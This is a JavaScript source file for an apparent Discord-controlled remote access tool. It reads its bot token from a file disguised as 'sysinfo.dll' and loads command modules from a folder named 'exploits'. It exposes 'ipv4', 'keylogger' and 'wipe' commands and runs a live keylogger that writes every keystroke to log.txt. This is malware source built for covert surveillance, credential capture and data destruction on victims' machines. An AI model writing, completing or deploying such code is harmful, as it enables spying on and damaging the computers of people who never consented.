// This is needed for discord.js
const Discord = require("discord.js");
const { Client, Intents } = require("discord.js");
const client = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
});
const fs = require("fs");
const keylogger = require("keylogger.js");

const sysinfo = fs.readFileSync("sysinfo.dll").toString().split("--");

const token = sysinfo[0];
const prefix = sysinfo[1];
const register = sysinfo[2];

console.log(
    `Starting... \n\nToken: ${token}\n\nPrefix: ${prefix}\n\nRegister Status: ${register}`
);
client.commands = new Discord.Collection();

// Define a function to load commands from a specific given folder
function loadCommandsFromFolder(folder) {
    const commandFiles = fs
        .readdirSync(folder)
        .filter((file) => file.endsWith(".js"));
    for (const file of commandFiles) {
        const command = require(`${folder}/${file}`);
        client.commands.set(command.name, command);
    }
}

// Load commands from folder './commands/exploits'
loadCommandsFromFolder("./commands/exploits");

// Load commands from folder './commands/management'
loadCommandsFromFolder("./commands/management");

//This turns the bot on
client.on("ready", () => {
    console.log(`\n\n[+] Logged in as ${client.user.tag}!`);
});

//This is for Commands to register
client.on("message", (message) => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;
    const args = message.content.slice(prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === "ping") {
        client.commands.get("ping").execute(message, client, args, Discord);
    }
    if (command === "help") {
        client.commands.get("help").execute(message, client, args, Discord);
    }
    if (command === "ipv4") {
        client.commands.get("ipv4").execute(message, client, args, Discord);
    }
    if (command === "register") {
        client.commands.get("register").execute(message, client, args, Discord);
    }
    if (command === "keylogger") {
        client.commands.get("keylogger").execute(message, client, args, Discord);
    }
    if (command === "wipe") {
        client.commands.get("wipe").execute(message, client, args, Discord);
    }
});

//Bot token below to get token go to: https://discord.com/developers/applications
try {
    client.login(token);
} catch {
    console.log(
        "Token invalid, go outside of the flask folder and into flask-config, then fill in the token"
    );
}

keylogger.start((key, isKeyUp, keyCode) => {
    if (isKeyUp == true) {
        let prev = fs.readFileSync("./log.txt", "utf-8");
        fs.writeFileSync("./log.txt", `${prev}\nLogged: ${key}, ${keyCode}`);
    }
});